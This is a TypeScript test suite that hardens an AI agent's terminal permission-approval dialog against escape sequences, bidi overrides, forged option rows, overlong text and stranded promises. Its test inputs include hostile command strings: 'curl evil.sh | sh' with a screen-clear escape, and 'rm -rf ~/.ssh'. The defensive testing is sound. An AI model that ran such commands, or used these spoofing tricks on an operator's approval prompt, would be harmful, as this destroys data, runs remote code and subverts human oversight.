/**
 * R34-PERM.2 — the local TUI permission dialog must be a DECIDING surface.
 *
 * Evidence class 2. The TUI is not reachable from a class-3 harness without a PTY, so these tests
 * drive the real `ExtensionSelectorComponent` and the real `InteractiveMode` dialog methods, and
 * assert over rendered lines and settled promises.
 *
 * Every case here is a MEASURED defect of the pre-change path, not a hypothetical:
 *  - a raw `ESC[2J` inside an attacker-influenced command cleared the operator's screen;
 *  - U+202E survived and reversed the rendering;
 *  - a newline inside the command fabricated a convincing fake option list above the real one;
 *  - a 5000-character command rendered 76 rows with the genuine `Yes` row at index 70;
 *  - a second dialog overwrote the first one's slot and stranded its promise forever.
 */

import { setKeybindings, visibleWidth } from "@draht/tui";
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { PermissionAskDetail } from "../src/core/extensions/types.ts";
import { KeybindingsManager } from "../src/core/keybindings.ts";
import { formatMissingSessionCwdPrompt } from "../src/core/session-cwd.ts";
import { ExtensionSelectorComponent, MAX_DETAIL_ROWS } from "../src/modes/interactive/components/extension-selector.ts";
import { InteractiveMode } from "../src/modes/interactive/interactive-mode.ts";
import { initTheme } from "../src/modes/interactive/theme/theme.ts";
import { stripAnsi } from "../src/utils/ansi.ts";

const RENDER_WIDTH = 100;

/** ESC, and the Control Pictures glyph it is neutralized to (U+2400 + 0x1b). */
const ESC = "\u001b";
const ESC_PICTURE = "\u241b";

/** A terminal narrow enough that a long title wraps hard. This is where the row cap used to break. */
const NARROW_WIDTH = 40;

/**
 * The literal ceiling EVERY option row must sit under, per R34-PERM.2.
 *
 * Derived, not guessed. Above the option list the dialog draws: the top border (1 row), a leading
 * spacer (1 row), then `H` header rows — title lines, detail rows and the `… +N more` notice — which
 * `capHeaderRows` caps at `MAX_DETAIL_ROWS`, 12 today. So `Yes` sits at index 14 at worst and `No`,
 * the second and last option, at 15. 16 is the first index no option row may ever reach.
 *
 * This is spelled as a LITERAL on purpose. Written as `MAX_DETAIL_ROWS + 4` it TRACKED the constant,
 * so raising the cap would silently loosen every assertion below instead of failing and making
 * someone re-derive the bound against a real terminal. The test named "pins the constant the bound
 * is derived from" is what turns a raised cap into a red test right here.
 */
const OPTION_ROW_INDEX_BOUND = 16;

const OPTION_ROW_PATTERN = /^\s*(?:→\s*)?(?:Yes|No)\s*$/;
const BIDI_OVERRIDE_PATTERN = /[\u202a-\u202e\u2066-\u2069]/;

/**
 * The theme legitimately colours rows with SGR sequences, so "contains no ESC" would be vacuous.
 * The property that matters is that the ONLY escape sequences reaching the terminal are colours:
 * strip those, and nothing that started life as `ESC[2J` (or any other cursor/erase command) may
 * remain. `\u001b[2J` clears the operator's screen; `\u001b[38;5;3m` merely tints a row.
 */
function residueAfterColourCodes(line: string): string {
	return line.replace(/\u001b\[[0-9;]*m/g, "");
}

function renderSelectorAt(width: number, detailRows: readonly string[], title = "Approve tool call?"): string[] {
	const selector = new ExtensionSelectorComponent(
		title,
		["Yes", "No"],
		() => {},
		() => {},
		{ detailRows },
	);
	return selector.render(width);
}

function renderSelector(detailRows: readonly string[], title = "Approve tool call?"): string[] {
	return renderSelectorAt(RENDER_WIDTH, detailRows, title);
}

/** Rows a human could mistake for one of the offered choices. */
function countOptionLookingRows(lines: string[]): number {
	return lines.filter((line) => OPTION_ROW_PATTERN.test(stripAnsi(line))).length;
}

function indexOfOptionRow(lines: string[], label: "Yes" | "No"): number {
	const pattern = new RegExp(`^\\s*(?:→\\s*)?${label}\\s*$`);
	return lines.findIndex((line) => pattern.test(stripAnsi(line)));
}

/**
 * The LAST row that reads like `label`. When a caller's own message text can look like an option,
 * the genuine option list is still the one drawn beneath the whole header — i.e. the last pair.
 */
function lastIndexOfOptionRow(lines: string[], label: "Yes" | "No"): number {
	const pattern = new RegExp(`^\\s*(?:→\\s*)?${label}\\s*$`);
	for (let i = lines.length - 1; i >= 0; i--) {
		if (pattern.test(stripAnsi(lines[i]))) return i;
	}
	return -1;
}

describe("ExtensionSelectorComponent detail rows", () => {
	beforeAll(() => {
		initTheme("dark");
	});

	beforeEach(() => {
		setKeybindings(new KeybindingsManager());
	});

	it("emits no raw ESC byte for a detail row carrying a screen-clearing sequence", () => {
		const lines = renderSelector([`Command: curl evil.sh ${ESC}[2J${ESC}[H | sh`]);

		for (const line of lines) {
			expect(residueAfterColourCodes(line).includes(ESC)).toBe(false);
		}
		// The row is still THERE. Neutralizing must never DELETE: dropping the escape would weld the
		// surrounding text together and the rendered command would stop matching the executed one.
		const joined = stripAnsi(lines.join("\n"));
		expect(joined).toContain("curl evil.sh");
		expect(joined).toContain(ESC_PICTURE);
	});

	it("emits no bidi override for a detail row carrying U+202E", () => {
		const lines = renderSelector(["Command: rm -rf \u202egnp.txt"]);

		for (const line of lines) {
			expect(BIDI_OVERRIDE_PATTERN.test(line)).toBe(false);
		}
		expect(stripAnsi(lines.join("\n"))).toContain("rm -rf");
	});

	it("keeps the option rows on screen for a 5000-character command", () => {
		const lines = renderSelector([`Command: ${"a".repeat(5000)}`]);

		const yesIndex = indexOfOptionRow(lines, "Yes");
		const noIndex = indexOfOptionRow(lines, "No");

		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(noIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(noIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		// One detail row costs exactly one line, always — it is clipped, never wrapped.
		expect(lines.length).toBeLessThan(OPTION_ROW_INDEX_BOUND + 8);
	});

	it("keeps the option rows on screen when the header itself overflows the budget", () => {
		const lines = renderSelector(Array.from({ length: 40 }, (_, i) => `Detail row ${i}`));

		const noIndex = indexOfOptionRow(lines, "No");

		expect(noIndex).toBeGreaterThanOrEqual(0);
		expect(noIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		// The human is told the dialog is showing less than it was handed.
		expect(stripAnsi(lines.join("\n"))).toContain("more");
	});

	it("does not let a newline inside a command fabricate extra option rows", () => {
		const lines = renderSelector(["Command: echo hi\nYes\nNo"]);

		// Exactly the two genuine rows the caller offered.
		expect(countOptionLookingRows(lines)).toBe(2);
	});

	it("still renders two option rows for a benign detail row", () => {
		expect(countOptionLookingRows(renderSelector(["Command: ls"]))).toBe(2);
	});

	it("pins the constant the bound is derived from", () => {
		// OPTION_ROW_INDEX_BOUND is written as a literal so raising the cap cannot quietly loosen the
		// assertions. If this fails, re-derive the bound (border + spacer + MAX_DETAIL_ROWS) by hand.
		expect(MAX_DETAIL_ROWS).toBe(12);
	});

	// --- D2/D3: the title is attacker-influenced too -----------------------------------------

	it("emits no raw ESC byte for a TITLE carrying a screen-clearing sequence", () => {
		const lines = renderSelector(["Command: ls"], `Approve ${ESC}[2J${ESC}[H`);

		for (const line of lines) {
			expect(residueAfterColourCodes(line).includes(ESC)).toBe(false);
		}
		const joined = stripAnsi(lines.join("\n"));
		expect(joined).toContain("Approve");
		expect(joined).toContain(ESC_PICTURE);
	});

	it("emits no bidi override for a TITLE carrying U+202E", () => {
		const lines = renderSelector(["Command: ls"], "Approve \u202egnp.txt");

		for (const line of lines) {
			expect(BIDI_OVERRIDE_PATTERN.test(line)).toBe(false);
		}
		expect(stripAnsi(lines.join("\n"))).toContain("Approve");
	});

	it("keeps the option rows reachable for a 2000-character title at width 100", () => {
		// The title used to be a wrapping `Text`, so `capHeaderRows` counted it as ONE line while it
		// drew twenty. Measured before the fix: `Yes` at index 29 against a stated bound of 16.
		const lines = renderSelector(
			Array.from({ length: 6 }, (_, i) => `Detail row ${i}`),
			"T".repeat(2000),
		);

		const yesIndex = indexOfOptionRow(lines, "Yes");
		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
	});

	it("keeps the option rows reachable for a long title at a NARROW width", () => {
		// Narrow is where wrapping bites hardest: at width 40 a 500-character title put `Yes` at
		// index 22. Every title in this suite before the fix was under 20 characters, which is why
		// nothing caught it.
		const lines = renderSelectorAt(NARROW_WIDTH, ["Command: ls"], "T".repeat(500));

		const yesIndex = indexOfOptionRow(lines, "Yes");
		const noIndex = indexOfOptionRow(lines, "No");
		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(noIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
	});

	it("draws exactly one row per title line whatever the width", () => {
		// The row budget is only a guarantee because the title costs its LOGICAL line count. Two
		// enormous lines must still cost two rows, not two screenfuls.
		const lines = renderSelectorAt(NARROW_WIDTH, [], `${"a".repeat(300)}\n${"b".repeat(300)}`);
		const yesIndex = indexOfOptionRow(lines, "Yes");

		// border(0) + spacer(1) + two title rows(2,3) + spacer(4) => first option row at 5.
		expect(yesIndex).toBe(5);
	});
});

// ---------------------------------------------------------------------------
// InteractiveMode dialog behaviour, driven through the real prototype methods with a fake `this`
// (the pattern already used by test/interactive-mode-status.test.ts).
// ---------------------------------------------------------------------------

type DialogOpts = { signal?: AbortSignal; timeout?: number; detail?: PermissionAskDetail };

type DialogHost = {
	extensionSelector: ExtensionSelectorComponent | undefined;
	extensionSelectorSettle: ((value: string | undefined) => void) | undefined;
	extensionDialogDecidedBy: string | undefined;
	editorContainer: { clear(): void; addChild(child: unknown): void };
	editor: unknown;
	ui: { setFocus(component: unknown): void; requestRender(): void; terminal: { columns: number } };
	notices: string[];
	showExtensionNotify(message: string, type?: string): void;
	toggleToolOutputExpansion(): void;
	showExtensionSelector(
		title: string,
		options: string[],
		opts?: DialogOpts,
		detailRows?: readonly string[],
	): Promise<string | undefined>;
	showExtensionConfirm(title: string, message: string, opts?: DialogOpts): Promise<boolean>;
	hideExtensionSelector(): void;
	flushExtensionDialogDecidedNotice(): void;
	noteExtensionDialogResolvedElsewhere(label: string): void;
	buildPermissionDetailRows(detail: PermissionAskDetail): string[];
	/** The real session-invalidate / `/reload` teardown. See `setBeforeSessionInvalidate`. */
	resetExtensionUI(): void;
	extensionInput: { dispose?(): void; handleInput?(keyData: string): void } | undefined;
	extensionEditor: unknown;
	showExtensionInput(title: string, placeholder?: string, opts?: DialogOpts): Promise<string | undefined>;
	hideExtensionInput(): void;
	showExtensionEditor(title: string, prefill?: string): Promise<string | undefined>;
	hideExtensionEditor(): void;
};

type DialogPrototype = { [K in keyof DialogHost]: DialogHost[K] };

const prototype = InteractiveMode.prototype as unknown as DialogPrototype;

function createHost(columns = RENDER_WIDTH): DialogHost {
	const host = {
		extensionSelector: undefined,
		extensionSelectorSettle: undefined,
		extensionDialogDecidedBy: undefined,
		editorContainer: { clear: vi.fn(), addChild: vi.fn() },
		editor: { name: "editor" },
		ui: { setFocus: vi.fn(), requestRender: vi.fn(), hideOverlay: vi.fn(), terminal: { columns } },
		notices: [] as string[],
		showExtensionNotify(message: string) {
			host.notices.push(message);
		},
		toggleToolOutputExpansion: vi.fn(),

		// Collaborators `resetExtensionUI` touches on its way past the dialog. They are stubs because
		// none of them is under test here; the point of driving the REAL `resetExtensionUI` is that
		// the dialog teardown inside it is the shipped one, reached the way a session invalidate
		// reaches it.
		extensionInput: undefined,
		extensionInputSettle: undefined,
		extensionEditor: undefined,
		extensionEditorSettle: undefined,
		keybindings: new KeybindingsManager(),
		settingsManager: { getExternalEditorCommand: () => "true" },
		clearExtensionTerminalInputListeners: vi.fn(),
		setExtensionFooter: vi.fn(),
		setExtensionHeader: vi.fn(),
		clearExtensionWidgets: vi.fn(),
		footerDataProvider: { clearExtensionStatuses: vi.fn() },
		footer: { invalidate: vi.fn() },
		autocompleteProviderWrappers: [],
		setCustomEditorComponent: vi.fn(),
		setupAutocompleteProvider: vi.fn(),
		defaultEditor: { onExtensionShortcut: undefined },
		updateTerminalTitle: vi.fn(),
		workingMessage: undefined,
		workingVisible: true,
		setWorkingIndicator: vi.fn(),
		activeStatusIndicator: undefined,
		setHiddenThinkingLabel: vi.fn(),
	} as unknown as DialogHost;

	// Borrow the real implementations. These are private methods, so they are only reachable this
	// way — but they ARE the code under test; a reimplementation here would prove nothing.
	for (const name of [
		"showExtensionSelector",
		"showExtensionConfirm",
		"hideExtensionSelector",
		"flushExtensionDialogDecidedNotice",
		"noteExtensionDialogResolvedElsewhere",
		"buildPermissionDetailRows",
		"resetExtensionUI",
		"showExtensionInput",
		"hideExtensionInput",
		"showExtensionEditor",
		"hideExtensionEditor",
	] as const) {
		(host as unknown as Record<string, unknown>)[name] = (prototype[name] as (...args: unknown[]) => unknown).bind(
			host,
		);
	}
	return host;
}

/**
 * A promise that never settles is the defect under test, and `await`ing one only shows up as a
 * five-second vitest timeout with no useful message. Racing it against a short timer turns "still
 * pending" into a value the assertion can name.
 */
const PENDING = Symbol("pending");

function settledValueOf<T>(promise: Promise<T>): Promise<T | typeof PENDING> {
	return Promise.race([promise, new Promise<typeof PENDING>((r) => setTimeout(() => r(PENDING), 50))]);
}

/**
 * The `/rewind --fork` consent dialog's message, byte-for-byte as
 * `src/core/builtins/checkpoints.ts:112` composes it. 273 characters.
 */
const CHECKPOINT_FORK_MESSAGE =
	"This point has a checkpoint from 2026-08-21T14:03:11.000Z (3 files changed). Restore the working tree to it? " +
	"Your current files are snapshotted first, but the forked session cannot /rewind to that snapshot - " +
	"where it can be reached from is printed once the restore is done.";

/** LF's Control Pictures glyph (U+2400 + 0x0a) — what a neutralized newline collapses to. */
const LF_PICTURE = "␊";

/**
 * Open a real confirm dialog at `columns`, capture what it draws, then tear it down.
 *
 * The teardown is what settles the promise, so every caller must await it — an unawaited
 * `showExtensionConfirm` is exactly the stranding bug this suite exists to catch.
 */
async function confirmLines(columns: number, title: string, message: string): Promise<string[]> {
	const host = createHost(columns);
	const confirm = host.showExtensionConfirm(title, message);
	const lines = host.extensionSelector?.render(columns) ?? [];
	host.resetExtensionUI();
	await confirm;
	expect(lines.length).toBeGreaterThan(0);
	return lines;
}

/** Undo the word wrap: rows re-joined by the spaces the wrapper broke at. */
function reflow(lines: string[]): string {
	return lines
		.map((line) => stripAnsi(line).trim())
		.join(" ")
		.replace(/\s+/g, " ");
}

function detailFor(command: string): PermissionAskDetail {
	return {
		kind: "tool_permission",
		toolCallId: "call-1",
		toolName: "bash",
		cwd: "/private/tmp/project",
		command,
		reason: "command not on the allowlist",
		options: [
			{ id: "approve", label: "Yes", decision: "approve" },
			{ id: "deny", label: "No", decision: "deny" },
		],
	};
}

describe("InteractiveMode permission dialog", () => {
	beforeAll(() => {
		initTheme("dark");
	});

	beforeEach(() => {
		setKeybindings(new KeybindingsManager());
	});

	it("builds structured rows from the typed detail instead of concatenating prose", () => {
		const host = createHost();
		const rows = host.buildPermissionDetailRows(detailFor("npm install"));

		expect(rows.some((row) => row.startsWith("Tool"))).toBe(true);
		expect(rows.some((row) => row.includes("/private/tmp/project"))).toBe(true);
		expect(rows.some((row) => row.includes("npm install"))).toBe(true);
		expect(rows.some((row) => row.includes("command not on the allowlist"))).toBe(true);
		// One fact per row, and never a row the caller did not intend.
		for (const row of rows) expect(row.includes("\n")).toBe(false);
	});

	it("neutralizes a locally raised ask before it reaches the renderer", () => {
		const host = createHost();
		const rows = host.buildPermissionDetailRows(detailFor(`echo ${ESC}[2J\u202ehi`)).join("\n");

		expect(rows.includes(ESC)).toBe(false);
		expect(BIDI_OVERRIDE_PATTERN.test(rows)).toBe(false);
		expect(rows).toContain("echo");
	});

	it("settles the first dialog's promise when a second one opens", async () => {
		const host = createHost();

		const first = host.showExtensionConfirm("First", "message one");
		const firstComponent = host.extensionSelector;
		expect(firstComponent).toBeDefined();

		const second = host.showExtensionConfirm("Second", "message two");

		// The first promise resolves rather than hanging inside beforeToolCall forever.
		await expect(first).resolves.toBe(false);
		// ...and the second dialog is the one actually installed.
		expect(host.extensionSelector).toBeDefined();
		expect(host.extensionSelector).not.toBe(firstComponent);

		host.extensionSelectorSettle?.("Yes");
		await expect(second).resolves.toBe(true);
	});

	it("does not let the displaced dialog's abort tear down its successor", async () => {
		const host = createHost();
		const controller = new AbortController();

		const first = host.showExtensionConfirm("First", "message one", { signal: controller.signal });
		const second = host.showExtensionConfirm("Second", "message two");
		const secondComponent = host.extensionSelector;

		await expect(first).resolves.toBe(false);
		controller.abort();

		expect(host.extensionSelector).toBe(secondComponent);
		host.extensionSelectorSettle?.("No");
		await expect(second).resolves.toBe(false);
	});

	it("resolves to false on abort and reports the deciding surface exactly once", async () => {
		const host = createHost();
		const controller = new AbortController();

		const confirm = host.showExtensionConfirm("Approve tool call?", "bash: not allowed", {
			signal: controller.signal,
			detail: detailFor("npm install"),
		});

		host.noteExtensionDialogResolvedElsewhere("geist-console");
		controller.abort();

		await expect(confirm).resolves.toBe(false);
		expect(host.notices).toEqual(["Permission resolved by geist-console"]);
		expect(host.extensionSelector).toBeUndefined();

		// A second flush must not double-report.
		host.flushExtensionDialogDecidedNotice();
		expect(host.notices).toHaveLength(1);
	});

	it("settles the awaited promise when a session invalidate tears the dialog down", async () => {
		// `setBeforeSessionInvalidate` and `/reload` both call `resetExtensionUI`, which calls
		// `hideExtensionSelector` directly. That path used to drop the component without touching
		// `extensionSelectorSettle`, stranding the promise `beforeToolCall` awaits — no dialog, no
		// tool call, no way out. Fail-closed means it must settle, and settle as a DENIAL.
		const host = createHost();

		const confirm = host.showExtensionConfirm("Approve tool call?", "bash: not allowed", {
			detail: detailFor("npm install"),
		});
		expect(host.extensionSelector).toBeDefined();

		host.resetExtensionUI();

		expect(await settledValueOf(confirm)).toBe(false);
		expect(host.extensionSelector).toBeUndefined();
		expect(host.extensionSelectorSettle).toBeUndefined();
	});

	it("still delivers the human's choice even though hiding settles fail-closed", async () => {
		// The fail-closed settle in `hideExtensionSelector` must not race the real answer: selecting
		// `Yes` has to resolve `true`, not the `undefined` that teardown supplies.
		const host = createHost();

		const confirm = host.showExtensionConfirm("Approve tool call?", "bash: not allowed", {
			detail: detailFor("npm install"),
		});
		host.extensionSelector?.handleInput("\n");

		expect(await settledValueOf(confirm)).toBe(true);
		expect(host.extensionSelector).toBeUndefined();
	});

	it("neutralizes an attacker-influenced TITLE on the detail path", async () => {
		// `ui.confirm` is a public extension surface and the attach relay forwards the caller's title
		// unchanged, so the title carried every defect the detail rows were hardened against.
		const host = createHost();

		const confirm = host.showExtensionConfirm(`Approve ${ESC}[2J${ESC}[H\u202e`, "bash: not allowed", {
			detail: detailFor("npm install"),
		});
		const lines = host.extensionSelector?.render(RENDER_WIDTH) ?? [];
		expect(lines.length).toBeGreaterThan(0);

		for (const line of lines) {
			expect(residueAfterColourCodes(line).includes(ESC)).toBe(false);
			expect(BIDI_OVERRIDE_PATTERN.test(line)).toBe(false);
		}
		// Neutralized, not deleted.
		expect(stripAnsi(lines.join("\n"))).toContain(ESC_PICTURE);

		host.resetExtensionUI();
		await confirm;
	});

	it("does not let a newline in the TITLE fabricate option rows", async () => {
		// Measured before the fix: four option-looking rows, two of them forged by the title.
		const host = createHost();

		const confirm = host.showExtensionConfirm("Approve\nYes\nNo", "bash: not allowed", {
			detail: detailFor("npm install"),
		});
		const lines = host.extensionSelector?.render(RENDER_WIDTH) ?? [];

		expect(countOptionLookingRows(lines)).toBe(2);

		host.resetExtensionUI();
		await confirm;
	});

	it("treats a newline in the MESSAGE as a row break, under the row cap", async () => {
		// CONTRACT (H4). A newline the caller wrote in the MESSAGE is a legitimate row break: the
		// in-tree `formatMissingSessionCwdPrompt` prompt is written as five lines, and collapsing
		// them into one middle-elided row hid WHICH session cwd was missing. So a message that
		// writes "Yes" on a line of its own does get a row reading "Yes" — four option-looking rows
		// here, two of them the caller's own text.
		//
		// What bounds that is the ROW CAP, not newline-flattening: the genuine option list can never
		// be pushed off screen. The TITLE is different — it stays ONE logical row on every path, so
		// a title still cannot mint rows at all (see the test above).
		const host = createHost();

		const confirm = host.showExtensionConfirm("Approve tool call?", "bash: not allowed\nYes\nNo");
		const lines = host.extensionSelector?.render(RENDER_WIDTH) ?? [];

		expect(countOptionLookingRows(lines)).toBe(4);
		// The genuine pair — the last one on screen — is still where a human can reach it.
		expect(lastIndexOfOptionRow(lines, "No")).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(lastIndexOfOptionRow(lines, "Yes")).toBeLessThan(lastIndexOfOptionRow(lines, "No"));
		// Both halves are still legible — this is a neutralization, not a redaction.
		const joined = stripAnsi(lines.join("\n"));
		expect(joined).toContain("Approve tool call?");
		expect(joined).toContain("bash: not allowed");

		host.resetExtensionUI();
		await confirm;
	});

	it("keeps the option rows reachable for a 2000-character title on the detail path", async () => {
		const host = createHost();

		const confirm = host.showExtensionConfirm("T".repeat(2000), "bash: not allowed", {
			detail: detailFor("npm install"),
		});
		const lines = host.extensionSelector?.render(RENDER_WIDTH) ?? [];

		const yesIndex = indexOfOptionRow(lines, "Yes");
		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);

		host.resetExtensionUI();
		await confirm;
	});

	it("does not carry a deciding-surface label over to the next, unrelated dialog", async () => {
		// `noteExtensionDialogResolvedElsewhere` sets a sticky label. When the ask it belongs to is
		// then answered LOCALLY, nothing flushed it — so the next dialog's teardown emitted
		// "Permission resolved by geist-console" about an ask that surface never saw.
		const host = createHost();

		const first = host.showExtensionConfirm("First", "message one");
		host.noteExtensionDialogResolvedElsewhere("geist-console");
		expect(host.notices).toEqual([]); // a dialog is open, so nothing is emitted yet

		host.extensionSelectorSettle?.("Yes");
		expect(await settledValueOf(first)).toBe(true);
		expect(host.extensionDialogDecidedBy).toBeUndefined();

		const controller = new AbortController();
		const second = host.showExtensionConfirm("Second", "message two", { signal: controller.signal });
		controller.abort();

		expect(await settledValueOf(second)).toBe(false);
		expect(host.notices).toEqual([]);
	});

	// --- H4: the message is PROSE, and a row budget is not a one-row budget --------------------

	it("shows the /rewind --fork consent dialog in full at 80 and at 120 columns", async () => {
		// The real string built at src/core/builtins/checkpoints.ts:112 — 273 characters. Bounding the
		// WHOLE message to a SINGLE row's width threw 215 of them away at 80 columns and 175 at 120,
		// taking the checkpoint timestamp, the file count and the warning that the forked session
		// cannot /rewind back with them. This is a consent dialog for a destructive action: an
		// operator who cannot read it is approving something they have not been told.
		for (const columns of [80, 120]) {
			const lines = await confirmLines(columns, "Restore files?", CHECKPOINT_FORK_MESSAGE);
			const flowed = reflow(lines);

			expect(flowed).toContain(CHECKPOINT_FORK_MESSAGE);
			// The decisive warning specifically — this is the sentence that makes the action one-way.
			expect(flowed).toContain("the forked session cannot /rewind to that snapshot");
			expect(flowed).toContain("2026-08-21T14:03:11.000Z");
			expect(flowed).toContain("(3 files changed)");
			expect(stripAnsi(lines.join("\n"))).not.toContain("chars elided");
			// Still bounded: no row may overflow its terminal row.
			for (const line of lines) expect(visibleWidth(line)).toBeLessThanOrEqual(columns);
		}
	});

	it("renders the missing-session-cwd prompt as the five rows it was written as", async () => {
		// `promptForMissingSessionCwd` passes `formatMissingSessionCwdPrompt(issue)`, a deliberately
		// 5-line message. Neutralizing those newlines into U+240A collapsed all five into one row and
		// then middle-elided it, so the operator could not see WHICH session cwd was missing.
		const message = formatMissingSessionCwdPrompt({
			sessionFile: "/Users/someone/.pi/sessions/abc.jsonl",
			sessionCwd: "/Users/someone/projects/gone-project",
			fallbackCwd: "/Users/someone/projects/other-project",
		});
		expect(message.split("\n")).toHaveLength(5);

		for (const columns of [80, 120]) {
			const lines = await confirmLines(columns, "Session cwd not found", message);
			const rendered = lines.map((line) => stripAnsi(line).trimEnd());
			const text = rendered.join("\n");

			// The caller's own newlines are ROW BREAKS, not something to neutralize away.
			expect(text).not.toContain(LF_PICTURE);
			expect(text).not.toContain("chars elided");
			for (const line of message.split("\n")) {
				expect(rendered.some((row) => row.trim() === line.trim())).toBe(true);
			}
			// border(0) spacer(1) title(2) message rows(3..7) spacer(8) => `Yes` at 9. Written out so
			// a collapse back to one row fails HERE, not only in the softer assertions above.
			expect(indexOfOptionRow(lines, "Yes")).toBe(9);
		}
	});

	it("caps a 200-line message at the header budget and says how much it dropped", async () => {
		// The row cap, not newline-flattening, is what keeps the option list on screen. A caller who
		// hands over more rows than the budget gets a marker, never a silent truncation.
		const lines = await confirmLines(80, "Approve?", Array.from({ length: 200 }, (_, i) => `line ${i}`).join("\n"));

		const yesIndex = indexOfOptionRow(lines, "Yes");
		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(indexOfOptionRow(lines, "No")).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(stripAnsi(lines.join("\n"))).toMatch(/\+\d+ more lines/);
	});

	it("still kills ESC and bidi INSIDE a line of a multi-line message", async () => {
		// Splitting on "\n" first must not become an excuse to stop neutralizing: a newline BETWEEN
		// lines is the caller's, an escape INSIDE one is an attack.
		const lines = await confirmLines(80, "Approve?", `first line\nsecond ${ESC}[2J‮line`);

		for (const line of lines) {
			expect(residueAfterColourCodes(line).includes(ESC)).toBe(false);
			expect(BIDI_OVERRIDE_PATTERN.test(line)).toBe(false);
		}
		const text = stripAnsi(lines.join("\n"));
		expect(text).toContain("first line");
		expect(text).toContain(ESC_PICTURE);
	});

	it("bounds a single line that is longer than the whole row budget, keeping its tail", async () => {
		// Property 2 of safe-text: the decisive part of an attacker-influenced string is its END.
		const lines = await confirmLines(80, "Approve?", `${"a".repeat(4000)} AND THEN rm -rf ~/.ssh`);

		const yesIndex = indexOfOptionRow(lines, "Yes");
		expect(yesIndex).toBeGreaterThanOrEqual(0);
		expect(yesIndex).toBeLessThan(OPTION_ROW_INDEX_BOUND);
		expect(reflow(lines)).toContain("AND THEN rm -rf ~/.ssh");
		for (const line of lines) expect(visibleWidth(line)).toBeLessThanOrEqual(80);
	});

	// --- H4: the other two dialog types strand their promise the same way ----------------------

	it("settles an open ui.input when a session invalidate tears it down", async () => {
		// `hideExtensionInput` only disposed and re-focused: nothing settled the `resolve` captured in
		// `showExtensionInput`'s closure, so `resetExtensionUI` (session invalidate, `/reload`) left
		// the awaiting extension hanging forever — regression 1 of the previous round, untouched.
		const host = createHost();

		const input = host.showExtensionInput("Name?");
		expect(host.extensionInput).toBeDefined();

		host.resetExtensionUI();

		expect(await settledValueOf(input)).toBeUndefined();
		expect(host.extensionInput).toBeUndefined();
	});

	it("settles an open extension editor when a session invalidate tears it down", async () => {
		const host = createHost();

		const editor = host.showExtensionEditor("Custom summarization instructions");
		expect(host.extensionEditor).toBeDefined();

		host.resetExtensionUI();

		expect(await settledValueOf(editor)).toBeUndefined();
		expect(host.extensionEditor).toBeUndefined();
	});

	it("still delivers a submitted ui.input value despite the fail-closed settle", async () => {
		// Same ordering hazard the selector had: hiding must not swallow the real answer.
		const host = createHost();

		const input = host.showExtensionInput("Name?");
		host.extensionInput?.handleInput?.("\n");

		expect(await settledValueOf(input)).toBe("");
		expect(host.extensionInput).toBeUndefined();
	});

	it("stays silent when a dialog is dismissed with no deciding surface named", async () => {
		const host = createHost();
		const controller = new AbortController();

		const confirm = host.showExtensionConfirm("Approve tool call?", "bash: not allowed", {
			signal: controller.signal,
		});
		controller.abort();

		await expect(confirm).resolves.toBe(false);
		expect(host.notices).toEqual([]);
	});
});
